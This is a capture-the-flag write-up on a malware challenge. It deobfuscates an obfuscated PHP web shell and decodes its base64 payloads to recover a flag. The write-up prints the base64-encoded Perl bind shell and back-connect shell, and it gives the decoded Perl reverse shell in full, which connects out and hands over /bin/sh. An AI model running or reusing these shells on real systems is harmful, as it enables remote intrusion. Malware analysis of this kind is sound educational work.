# H@cktivityCon 2021 - Phonetic

![date](https://img.shields.io/badge/date-19.09.2021-brightgreen.svg)  
![solved in time of CTF](https://img.shields.io/badge/solved-in%20time%20of%20CTF-brightgreen.svg)  
![malware category](https://img.shields.io/badge/category-malware-lightgrey.svg)
![score](https://img.shields.io/badge/score-362-blue.svg)
![solves](https://img.shields.io/badge/solves-112-brightgreen.svg)

## Description
Author: @JohnHammond#6971

It's easy to find the flag... just sound it out!

## Solution

Firstly, identifying the file type , using the file command
```
phonetic: PHP script, ASCII text, with very long lines
```
Viewing the code, we see that it is obuscated and hard to read . So I cleaned up the code and tried to make sense of the code ([Cleaned Code](https://github.com/m5fisker/Writeups/blob/main/H%40cktivityCon%202021/Phonetic/phonetic_stage1_cleaned.php))

After deobsucating the code , I found some interesting sections
```
// Function to perform certain actions and retuns a string value
 function firstFunction($input1, $input2 = '')
 { 
 	$firstValue = $input1;
 	$secondValue = '';
 	for ($i = 0; $i < strlen($firstValue);)
 		{ 
 			for ($j = 0; $j < strlen($input2) && $i < strlen($firstValue); $j++, $i++) 
 			{ 
 					$secondValue .= $firstValue[$i] ^ $input2[$j]; 
 			} 
 		} 
 		return $secondValue; 
 }
```

```
//Looping with a concatenation and adding it to emptyString1
foreach([24,4,26,31,29,2,37,20,31,6,1,20,31] as $k){
   $emptyString1 .= $jqueryValue[$k];    //result - base64_decode
}

//Looping with a concatenation and adding it to emptyString2
foreach([26,16,14,14,31,33] as $k){
   $emptyString2 .= $jqueryValue[$k];   //result - strrev
}

//Running strrev on a string of characters
$k = $emptyString2('n'.''.''.'o'.''.''.'i'.''.'t'.''.'c'.''.'n'.''.'u'.'f'.''.''.''.''.'_'.''.''.''.'e'.''.'t'.''.'a'.''.'e'.''.''.''.''.'r'.''.''.''.''.'c'); 
//result - create_function

```

Finally at the end section i modified the code to display the result instead of creating a function 

```
//Modified to display result instead of creating a function
$deobsucatedResult = $emptyString1( firstFunction($emptyString1($bigBlob), "tVEwfwrN302"));
echo "$deobsucatedResult";
```

I piped the result out into [phonetic_stage2.php](https://github.com/m5fisker/Writeups/blob/main/H%40cktivityCon%202021/Phonetic/phonetic_stage2.php)

Reviewing the code I found two interesting parts 

```
$back_connect_p="IyEvdXNyL2Jpbi9wZXJsCnVzZSBTb2NrZXQ7CiRpYWRkcj1pbmV0X2F0b24oJEFSR1ZbMF0pIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsKJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGR
pZSgiRXJyb3I6ICQhXG4iKTsKJHByb3RvPWdldHByb3RvYnluYW1lKCd0Y3AnKTsKc29ja2V0KFNPQ0tFVCwgUEZfSU5FVCwgU09DS19TVFJFQU0sICRwcm90bykgfHwgZGllKCJFcnJvcjogJCFcbiIpOwpjb25uZWN0KFNPQ0tFVCw
gJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7Cm9wZW4oU1RESU4sICI+JlNPQ0tFVCIpOwpvcGVuKFNURE9VVCwgIj4mU09DS0VUIik7Cm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsKbXkgJHN0ciA9IDw8RU5EOwpiZWdpbiA
2NDQgdXVlbmNvZGUudXUKRjlGUUE5V0xZOEM1Qy0jLFEsVjBRLENEVS4jLFUtJilFLUMoWC0mOUM5IzhTOSYwUi1HVGAKYAplbmQKRU5ECnN5c3RlbSgnL2Jpbi9zaCAtaSAtYyAiZWNobyAke3N0cmluZ307IGJhc2giJyk7CmNsb3N
lKFNURElOKTsKY2xvc2UoU1RET1VUKTsKY2xvc2UoU1RERVJSKQ==";
       $bind_port_p="IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7DQpsaXN0ZW4oUywzKSB8fCBkaWUgIkNhbnQgbGlzdGVuIHBvcnRcbiI7DQp3aGlsZSgxKSB7DQoJYWNjZXB0KENPTk4sUyk7DQoJaWYoISgkcGlkPWZvcmspKSB7DQoJCWRpZSAiQ2Fubm90IGZvcmsiIGlmICghZGVmaW5lZCAkcGlkKTsNCgkJb3BlbiBTVERJTiwiPCZDT05OIjsNCgkJb3BlbiBTVERPVVQsIj4mQ09OTiI7DQoJCW9wZW4gU1RERVJSLCI+JkNPTk4iOw0KCQlleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCgkJY2xvc2UgQ09OTjsNCgkJZXhpdCAwOw0KCX0NCn0=";
        
```

These where base64 encoded . After decrypting ```$back_connect``` we get the following result 

```
#!/usr/bin/perl
use Socket;
$iaddr=inet_aton($ARGV[0]) || die("Error: $!\n");
$paddr=sockaddr_in($ARGV[1], $iaddr) || die("Error: $!\n");
$proto=getprotobyname('tcp');
socket(SOCKET, PF_INET, SOCK_STREAM, $proto) || die("Error: $!\n");
connect(SOCKET, $paddr) || die("Error: $!\n");
open(STDIN, ">&SOCKET");
open(STDOUT, ">&SOCKET");
open(STDERR, ">&SOCKET");
my $str = <<END;
begin 644 uuencode.uu
F9FQA9WLY8C5C-#,Q,V0Q,CDU.#,U-&)E-C(X-&9C9#8S9&0R-GT`
`
end
END
system('/bin/sh -i -c "echo ${string}; bash"');
close(STDIN);
close(STDOUT);
close(STDERR)
```

There is an interesting section containing **uuencode** and a string ```F9FQA9WLY8C5C-#,Q,V0Q,CDU.#,U-&)E-C(X-&9C9#8S9&0R-GT ```

## Flag

Decoding the string with uuencode we get the flag 
 ``` flag{9b5c4313d12958354be6284fcd63dd26}  ```

